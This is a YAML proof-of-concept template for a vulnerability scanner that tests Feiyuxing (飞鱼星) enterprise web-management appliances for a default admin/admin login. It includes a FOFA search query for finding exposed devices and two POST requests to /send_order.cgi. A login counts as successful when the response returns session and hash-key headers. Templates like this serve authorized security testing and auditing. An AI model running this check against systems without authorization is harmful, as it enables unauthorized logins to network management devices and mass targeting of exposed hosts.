id: poc-yaml-feiyuxing-weak-password
info:
  name: 飞鱼星企业级智能上网行为管理系统 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: 企业级智能上网行为管理系统
  fofa: title=="飞鱼星企业级智能上网行为管理系统"
requests:
- method: POST
  path: /send_order.cgi?parameter=login
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: '{"username":"admin","password":"asdasdwadawdaa"}'
  expression: status_code == 200 && contains(body,"error")
- method: POST
  path: /send_order.cgi?parameter=login
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: '{"username":"admin","password":"admin"}'
  expression: status_code == 200 && contains(headers,"hash_key=") && contains(headers,"session_id")
    && contains(body,"ok")
variables: {}
transport: http
